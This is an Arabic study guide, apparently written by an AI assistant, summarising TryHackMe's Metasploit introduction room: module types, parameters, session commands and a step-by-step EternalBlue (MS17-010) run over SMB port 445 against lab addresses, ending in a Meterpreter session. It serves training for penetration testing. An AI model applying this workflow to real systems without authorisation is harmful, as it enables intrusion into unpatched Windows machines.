تمام يا معلم 👨‍💻🔥  
هكتب لك **نفس الملخص لكن بتفصيل أعمق** بحيث يبقى معاك كأنه **مرجع كامل لروم Metasploit: Introduction**.  
هقسمه لك بشكل واضح:

1️⃣ الفكرة العامة  
2️⃣ المصطلحات  
3️⃣ مكونات Metasploit  
4️⃣ أنواع الـ modules  
5️⃣ طريقة استخدام Metasploit خطوة خطوة  
6️⃣ شرح كل Parameter  
7️⃣ إدارة الـ Sessions  
8️⃣ تحليل exploit EternalBlue  
9️⃣ طريقة التفكير كمخترق  
🔟 الملخص العملي للهجوم

خليه عندك وارجعله دايمًا وانت بتحل رومات.

---

# أولاً: ما هو Metasploit

**Metasploit Framework**

الترجمة:  
إطار عمل ميتاسبلويت.

هو:

**أشهر أداة في العالم لاستخدام واستغلال الثغرات الأمنية.**

تستخدم في مجال:

**Penetration Testing (اختبار الاختراق)**.

---

## ما هو Penetration Testing

الترجمة:

اختبار الاختراق.

وهو:

محاكاة هجوم حقيقي على النظام لمعرفة:

- هل فيه ثغرات؟
    
- هل يمكن اختراق النظام؟
    
- كيف يمكن إصلاحها؟
    

---

## لماذا Metasploit مهم

قبل Metasploit كان المخترق يحتاج:

- كتابة exploit بنفسه
    
- تعديل الكود
    
- إعداد payload
    

أما Metasploit:

يوفر **مكتبة ضخمة من exploits الجاهزة**.

يعني:

بدلاً من كتابة exploit  
يمكنك **تشغيله مباشرة**.

---

# ثانياً: مراحل الهجوم التي يدعمها Metasploit

الميتاسبلويت يمكن أن يستخدم في عدة مراحل من الاختراق:

---

# 1️⃣ Information Gathering

الترجمة:

جمع المعلومات.

مثل:

- معرفة الخدمات
    
- معرفة البورتات
    
- معرفة النظام
    

---

# 2️⃣ Scanning

الترجمة:

الفحص.

مثل:

- فحص الشبكة
    
- اكتشاف الخدمات
    
- اكتشاف الثغرات
    

---

# 3️⃣ Exploitation

الترجمة:

استغلال الثغرة.

وهي المرحلة التي يتم فيها:

تشغيل exploit للحصول على **وصول للنظام**.

---

# 4️⃣ Post Exploitation

الترجمة:

ما بعد الاختراق.

مثل:

- استخراج كلمات المرور
    
- التحكم في الجهاز
    
- رفع الامتيازات
    
- التحرك داخل الشبكة
    

---

# ثالثاً: أنواع Metasploit

يوجد نسختان رئيسيتان.

---

# Metasploit Pro

الترجمة:

النسخة الاحترافية.

المميزات:

- مدفوعة
    
- واجهة رسومية (GUI)
    
- أتمتة العمليات
    

تستخدم غالباً في:

الشركات الأمنية.

---

# Metasploit Framework

الترجمة:

النسخة المفتوحة المصدر.

المميزات:

- مجانية
    
- تعمل من سطر الأوامر
    
- الأكثر استخداماً لدى الهاكرز.
    

موجودة في:

- Kali Linux
    
- Parrot OS
    
- AttackBox
    

---

# رابعاً: المكونات الرئيسية لـ Metasploit

الميتاسبلويت يتكون من ثلاثة أجزاء رئيسية.

---

# 1️⃣ msfconsole

الترجمة:

واجهة Metasploit الأساسية.

تشغيلها يتم بالأمر:

```
msfconsole
```

بعد التشغيل يظهر:

```
msf6 >
```

هذا يسمى:

**Metasploit prompt**

وهو المكان الذي تنفذ فيه كل الأوامر.

---

# 2️⃣ Modules

Modules = وحدات.

هي عبارة عن **سكريبتات جاهزة** لتنفيذ مهام مختلفة.

كل Module له وظيفة.

---

## أنواع Modules

---

# Exploit Modules

الترجمة:

وحدات استغلال الثغرات.

وظيفتها:

استغلال ثغرة معينة في النظام.

مثال:

```
exploit/windows/smb/ms17_010_eternalblue
```

---

# Auxiliary Modules

الترجمة:

وحدات مساعدة.

تستخدم في:

- scanning
    
- enumeration
    
- brute force
    

مثال:

```
auxiliary/scanner/smb/smb_version
```

---

# Payload Modules

Payload = حمولة الهجوم.

وهو الكود الذي ينفذ بعد نجاح exploit.

مثال:

reverse shell.

---

# Post Modules

Post = ما بعد الاختراق.

تستخدم بعد الحصول على access.

مثل:

- استخراج كلمات المرور
    
- جمع معلومات النظام
    

---

# Encoder Modules

تستخدم لتشفير payload لتجاوز أنظمة الحماية.

---

# 3️⃣ Tools

بعض الأدوات تأتي مع Metasploit.

مثل:

---

## msfvenom

أداة لإنشاء payloads.

مثال:

إنشاء reverse shell.

---

## pattern_create

أداة تستخدم في:

exploit development.

---

## pattern_offset

تستخدم لتحديد موقع crash في buffer overflow.

---

# خامساً: أنواع الـ Prompts في Metasploit

أثناء العمل سترى عدة أنواع من prompts.

---

# 1️⃣ Linux Prompt

```
root@kali:~#
```

هذا سطر أوامر لينكس.

لا يمكنك استخدام أوامر Metasploit هنا.

---

# 2️⃣ Metasploit Prompt

```
msf6 >
```

هذا يعني أن Metasploit يعمل.

لكن لم يتم اختيار module.

---

# 3️⃣ Context Prompt

مثال:

```
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

هذا يعني أنك داخل module.

يمكنك الآن تنفيذ أوامر exploit.

---

# 4️⃣ Meterpreter Prompt

```
meterpreter >
```

يظهر بعد نجاح الاختراق.

Meterpreter هو:

**أداة تحكم متقدمة في الجهاز المخترق**.

---

# 5️⃣ Target Shell

مثال:

```
C:\Windows\system32>
```

هذا يعني أنك حصلت على **سطر أوامر الجهاز المخترق**.

---

# سادساً: أهم Parameters في Metasploit

كل exploit يحتاج إعدادات.

تسمى:

Parameters.

---

# RHOSTS

Remote Hosts

الترجمة:

الأجهزة المستهدفة.

مثال:

```
set RHOSTS 10.10.10.5
```

يمكن أيضاً استخدام:

- شبكة كاملة
    

```
10.10.10.0/24
```

- ملف يحتوي على IPs
    

```
file:/targets.txt
```

---

# RPORT

Remote Port

الترجمة:

البورت الذي تعمل عليه الخدمة.

مثال:

```
set RPORT 445
```

---

# PAYLOAD

الحمولة.

وهي الكود الذي سيتم تشغيله بعد الاختراق.

مثال:

```
windows/x64/meterpreter/reverse_tcp
```

---

# LHOST

Local Host

IP جهاز المهاجم.

---

# LPORT

Local Port

البورت الذي سيعود عليه الاتصال.

مثال:

```
set LPORT 4444
```

---

# SESSION

Session ID.

وهو رقم الجلسة المفتوحة.

---

# سابعاً: أوامر Metasploit المهمة

---

# show options

يعرض الإعدادات المطلوبة للـ exploit.

```
show options
```

---

# set

تحديد قيمة parameter.

```
set PARAMETER VALUE
```

مثال:

```
set RHOSTS 10.10.165.39
```

---

# setg

تحديد قيمة global.

```
setg RHOSTS 10.10.165.39
```

تطبق على كل modules.

---

# unset

حذف قيمة parameter.

```
unset PAYLOAD
```

---

# unset all

مسح كل الإعدادات.

```
unset all
```

---

# back

العودة خطوة للخلف.

---

# exploit

تشغيل exploit.

```
exploit
```

---

# run

مرادف للأمر exploit.

---

# exploit -z

تشغيل exploit وإرسال الجلسة للخلفية.

---

# ثامناً: Sessions

Session = اتصال بينك وبين الجهاز المخترق.

---

# عرض الجلسات

```
sessions
```

---

# الدخول إلى جلسة

```
sessions -i 1
```

---

# إرجاع الجلسة للخلفية

```
background
```

أو

CTRL + Z

---

# تاسعاً: مثال Exploit حقيقي

Exploit:

```
ms17_010_eternalblue
```

يستغل ثغرة:

**EternalBlue**

---

## الثغرة تستهدف

خدمة:

SMB

البورت:

```
445
```

---

## الأنظمة المتأثرة

- Windows 7
    
- Windows Server 2008
    

---

## استخدام الثغرة في الواقع

تم استخدامها في هجوم:

**WannaCry Ransomware**

الذي أصاب:

أكثر من 200 ألف جهاز.

---

# عاشراً: طريقة التفكير كمخترق

مثال:

أجريت scan باستخدام nmap.

ووجدت:

```
445 open smb
```

التفكير الصحيح:

---

# 1

فحص SMB.

```
nmap --script smb*
```

---

# 2

البحث عن exploit.

```
search smb
```

---

# 3

البحث عن ms17.

```
search ms17
```

---

# 4

استخدام exploit.

```
use exploit/windows/smb/ms17_010_eternalblue
```

---

# 5

تحديد الهدف.

```
set RHOSTS 10.10.10.5
```

---

# 6

تشغيل الهجوم.

```
exploit
```

---

# 7

الحصول على session.

```
meterpreter >
```

---

# الملخص النهائي للروم

العملية الكاملة لاستخدام Metasploit تكون:

```
msfconsole
```

تشغيل الأداة.

↓

```
search
```

البحث عن exploit.

↓

```
use
```

اختيار exploit.

↓

```
show options
```

معرفة الإعدادات المطلوبة.

↓

```
set
```

ضبط الإعدادات.

↓

```
exploit
```

تشغيل الهجوم.

↓

```
meterpreter
```

الحصول على shell.

↓

```
sessions
```

إدارة الجلسات.

---

💡 نصيحة مهمة جداً لك:

لو أتقنت Metasploit ستتمكن من حل **نسبة كبيرة من رومات TryHackMe بسهولة**.

---

لو حابب كمان، أعمل لك حاجة قوية جداً:

أشرح لك **Metasploit بعقلية الهاكر الحقيقي**  
يعني:

- كيف يعرف المخترق أي exploit يستخدم
    
- كيف يفكر بعد رؤية البورت
    
- كيف يختار payload
    
- كيف يثبت السيطرة على الجهاز
    

وده بصراحة أهم من الروم نفسها.